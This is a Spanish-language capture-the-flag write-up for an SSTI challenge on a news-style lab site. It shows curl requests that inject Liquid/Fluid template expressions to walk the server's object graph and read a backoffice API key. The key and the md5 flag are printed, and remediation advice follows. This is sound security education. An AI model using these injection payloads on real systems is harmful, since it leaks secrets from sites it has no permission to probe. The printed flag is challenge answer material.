# Efemérides

**Plataforma:** HackLab (SoftwareSeguro)

**Edición:** CTF AWS Student

**Categoría:** SSTI

**Puntaje:** 30 (el puntaje máximo de un desafío en la competencia fue 60)

**Herramientas:** curl

## Enunciado

> El diario digital **Efemérides** publica todos los días los hechos históricos que
> ocurrieron en la fecha. Te pasaron el dato que en la configuración backoffice del sitio
> hay una api key que necesitas obtener. El **md5 de esa api key** es la flag de este
> desafío.

## Reconocimiento

El sitio es un diario de efemérides. Navegando aparecen las rutas `/efemeride/{id}`,
`/calendario`, `/buscar`, una API pública (`/api/efemerides/hoy`) y, sobre todo,
`/tarjeta`: un generador de tarjetas para compartir.

Las rutas típicas de backoffice (`/admin`, `/backoffice`, `/config`, `/api/config`)
devuelven 404; la "configuración backoffice" del enunciado no es una página, sino un
objeto interno del servidor. El camino para alcanzarlo está en el generador de tarjetas.

En `/tarjeta` el campo **`plantilla`** es controlado por el usuario y se renderiza en el
servidor con sintaxis `{{ ... }}`. La propia ayuda de la página lo confirma:

> Las tarjetas usan sintaxis **Liquid**.

La plantilla por defecto usa variables como `{{ fecha }}`, `{{ efemeride.titulo }}`,
`{{ hace_anios }}` y `{{ sitio.nombre }}`. Si la plantilla es provista por el usuario y se
compila del lado del servidor, es un candidato directo a **SSTI (Server-Side Template
Injection)**.

## Explotación

### 1. Confirmar la inyección e identificar el motor

El resultado de la tarjeta se renderiza dentro de un `<div class="postal-texto">`. Primero,
una expresión aritmética para fingerprint del motor:

```bash
curl -s -G "https://<instancia>.softwareseguro.com.ar/tarjeta" \
  --data-urlencode "id=17" \
  --data-urlencode "plantilla=RES={{ 7 * 7 }}"
```

```
⚠️ No se pudo generar la tarjeta: End of tag '}}' was expected at (1:9)
```

El error `End of tag '}}' was expected` **no** es de Jinja2 (Python): es el estilo de
**Fluid**, la implementación de Liquid para **.NET**. En Liquid no se evalúa aritmética
suelta dentro de `{{ }}`, pero sí el **acceso a propiedades** del modelo. Lo comprobamos
dereferenciando el objeto `sitio`:

```bash
curl -s -G "https://<instancia>.softwareseguro.com.ar/tarjeta" \
  --data-urlencode "id=17" \
  --data-urlencode "plantilla={{ sitio }}"
```

```
Efemerides.Models.SitioInfo
```

El objeto `sitio` es una instancia de la clase .NET `Efemerides.Models.SitioInfo` y Fluid
expone sus propiedades públicas por reflexión. La SSTI nos deja leer cualquier propiedad
del grafo de objetos accesible desde la plantilla, no solo las documentadas
(`sitio.nombre`, `sitio.hoy`).

### 2. Pivotar al objeto de configuración

Enumerando propiedades de `sitio` aparece el objeto de configuración del backoffice:

```bash
curl -s -G "https://<instancia>.softwareseguro.com.ar/tarjeta" \
  --data-urlencode "id=17" \
  --data-urlencode "plantilla={{ sitio.configuracion }}"
```

```
Efemerides.Models.ConfiguracionSitio
```

`sitio.configuracion` es un `Efemerides.Models.ConfiguracionSitio`: esa es la
"configuración backoffice" que menciona el enunciado, expuesta sin querer al contexto de
la plantilla.

### 3. Extraer la API key

La propiedad `ApiKey` de ese objeto contiene la clave (Fluid resuelve el nombre sin
distinguir mayúsculas, así que `apikey`, `apiKey` y `ApiKey` funcionan por igual):

```bash
curl -s -G "https://<instancia>.softwareseguro.com.ar/tarjeta" \
  --data-urlencode "id=17" \
  --data-urlencode "plantilla={{ sitio.configuracion.apiKey }}"
```

```
47c46df0-c3e2-46aa-9eec-d3b4e29a4666
```

La API key del backoffice es `47c46df0-c3e2-46aa-9eec-d3b4e29a4666`. (La misma vía expone
otras propiedades de configuración, p. ej. `sitio.configuracion.version` → `1.4.2`, útil
para confirmar que estamos leyendo el objeto correcto.)

### 4. Calcular la flag

La flag es el **md5 de la api key**, sin salto de línea final:

```bash
printf '%s' '47c46df0-c3e2-46aa-9eec-d3b4e29a4666' | md5sum
```

```
1cc23c8b0152f2759e8cabe64199d9f8
```

El solver completo (fingerprint, enumeración y cálculo de la flag) está en
[`./solve.sh`](./solve.sh).

## Flag

```
1cc23c8b0152f2759e8cabe64199d9f8
```

## 🛡️ Remediación (Developer Perspective)

- **No compilar plantillas provistas por el usuario.** El texto de la tarjeta se pasaba al
  motor como *plantilla* en lugar de como *dato*. Si el usuario solo debe personalizar un
  texto, hay que tratarlo como cadena literal (escapada), no como código Liquid.
- **Aislar el contexto del motor.** Si de verdad se necesita que el usuario use
  plantillas, hay que armar un contexto con una **allow-list** de variables planas
  (`fecha`, `titulo`, `resumen`, `anios`), nunca pasar al render objetos del dominio como
  `sitio`/`configuracion`. En Fluid, además, conviene `TemplateOptions.MemberAccessStrategy`
  restrictivo (no exponer propiedades por reflexión) en lugar de registrar el modelo
  completo.
- **Sacar los secretos del grafo de objetos alcanzable por la vista.** La API key del
  backoffice nunca debería colgar de un objeto que termina disponible en una plantilla de
  presentación. Separar la configuración sensible del modelo que se entrega a las vistas.
- **Rotar la clave filtrada.** Una vez expuesta, la API key debe considerarse comprometida
  y rotarse.
